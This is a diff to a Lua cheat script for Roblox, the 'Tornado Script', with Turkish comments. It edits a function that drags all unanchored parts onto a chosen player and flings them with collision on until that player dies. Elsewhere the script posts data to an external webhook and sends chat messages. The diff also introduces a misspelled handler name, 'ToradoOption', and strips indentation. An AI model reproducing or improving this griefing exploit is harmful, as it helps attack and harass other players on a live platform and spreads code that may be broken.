@@ -117,14 +117,14 @@ local function sendWebhook(webhookUrl, data)
         })
 
         if response and response.StatusCode == 204 then
-            print("...")
+            print("...!")
         else
             warn("...: ", response and response.StatusMessage or "Bilinmeyen hata")
         end
     end)
     
     if not success then
-        warn("...: ", result)
+        warn("Webhook gönderim hatası: ", result)
     end
 end
 
@@ -133,7 +133,7 @@ local success, webhookData = pcall(createWebhookData)
 if success then
     sendWebhook(webhookUrl, webhookData)
 else
-    warn("Webhook verisi oluşturma hatası: ", webhookData)
+    warn("...: ", webhookData)
 end
 
 print("Gui Started")
@@ -950,14 +950,13 @@ local function collectUnanchoredParts()
     return unanchoredParts
 end
 
--- Çekim gücü uygulama
+-- Çekim gücü uygulama ve sürekli takip
 local function applyPullToParts(target)
     local unanchoredParts = collectUnanchoredParts()
     for _, part in pairs(unanchoredParts) do
         if part and part.Parent then
             local bodyPosition = Instance.new("BodyPosition")
             bodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
-            bodyPosition.Position = target.Position
             bodyPosition.D = 500
             bodyPosition.P = 10000
             bodyPosition.Parent = part
@@ -971,10 +970,24 @@ local function applyPullToParts(target)
             heartbeatConnection:Disconnect()
             return
         end
-        for _, bodyPosition in pairs(pullConnections) do
-            if bodyPosition and bodyPosition.Parent then
-                bodyPosition.Position = targetPlayer.Position
+        local humanoid = targetPlayer.Parent:FindFirstChild("Humanoid")
+        if humanoid and humanoid.Health > 0 then -- Check if player is alive
+            for _, bodyPosition in pairs(pullConnections) do
+                if bodyPosition and bodyPosition.Parent then
+                    bodyPosition.Position = targetPlayer.Position -- Real-time tracking
+                end
             end
+            -- Re-collide blocks with the player
+            for _, part in pairs(unanchoredParts) do
+                if part and part.Parent then
+                    part.Velocity = (targetPlayer.Position - part.Position).Unit * 50 -- Move towards player
+                    part.CanCollide = true
+                end
+            end
+        else
+            stopPulling() -- Stop if player is dead
+            StopButton.Visible = false
+            ExitButton.Visible = true
         end
     end)
 end
@@ -988,6 +1001,11 @@ local function stopPulling()
     end
     pullConnections = {}
     isPulling = false
+    for _, part in pairs(collectUnanchoredParts()) do
+        if part then
+            part.CanCollide = false -- Reset collision
+        end
+    end
 end
 
 -- Minigun işlevi
@@ -1143,50 +1161,50 @@ SpeedInput.FocusLost:Connect(function(enterPressed)
 end)
 
 -- Açılır menü seçenekleri
-TornadoOption.MouseButton1Click:Connect(function()
-    motionType = "Tornado"
-    ToggleButton.Text = ringPartsEnabled and "Tornado Parts On" or "Tornado Parts Off"
-    DropdownFrame.Visible = false
-    dropdownVisible = false
-    ArrowButton.Text = "↓"
-    playSound("12221967")
+ToradoOption.MouseButton1Click:Connect(function()
+motionType = "Tornado"
+ToggleButton.Text = ringPartsEnabled and "Tornado Parts On" or "Tornado Parts Off"
+DropdownFrame.Visible = false
+dropdownVisible = false
+ArrowButton.Text = "↓"
+playSound("12221967")
 end)
 
 SaturnOption.MouseButton1Click:Connect(function()
-    motionType = "Saturn"
-    ToggleButton.Text = ringPartsEnabled and "Saturn Parts On" or "Saturn Parts Off"
-    DropdownFrame.Visible = false
-    dropdownVisible = false
-    ArrowButton.Text = "↓"
-    playSound("12221967")
+motionType = "Saturn"
+ToggleButton.Text = ringPartsEnabled and "Saturn Parts On" or "Saturn Parts Off"
+DropdownFrame.Visible = false
+dropdownVisible = false
+ArrowButton.Text = "↓"
+playSound("12221967")
 end)
 
 -- Oyuncu küçük resmi
 local success, userId = pcall(function()
-    return Players:GetUserIdFromNameAsync("Arasbey232323")
+return Players:GetUserIdFromNameAsync("Arasbey232323")
 end)
 if success and userId then
-    local thumbType = Enum.ThumbnailType.HeadShot
-    local thumbSize = Enum.ThumbnailSize.Size620x720
-    local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
-    if isReady then
-        StarterGui:SetCore("SendNotification", {
-            Title = "Tornado Script - Arassys",
-            Text = ":)",
-            Icon = content,
-            Duration = 5
-        })
-    end
+local thumbType = Enum.ThumbnailType.HeadShot
+local thumbSize = Enum.ThumbnailSize.Size620x720
+local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
+if isReady then
+StarterGui:SetCore("SendNotification", {
+Title = "Tornado Script - Arassys",
+Text = ":)",
+Icon = content,
+Duration = 5
+})
+end
 end
 
 -- Sohbet mesajı
 local function SendChatMessage(message)
-    pcall(function()
-        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-            local textChannel = TextChatService.TextChannels.RBXGeneral
-            textChannel:SendAsync(message)
-        else
-            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
-        end
-    end)
+pcall(function()
+if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+local textChannel = TextChatService.TextChannels.RBXGeneral
+textChannel:SendAsync(message)
+else
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+end
+end)
 end
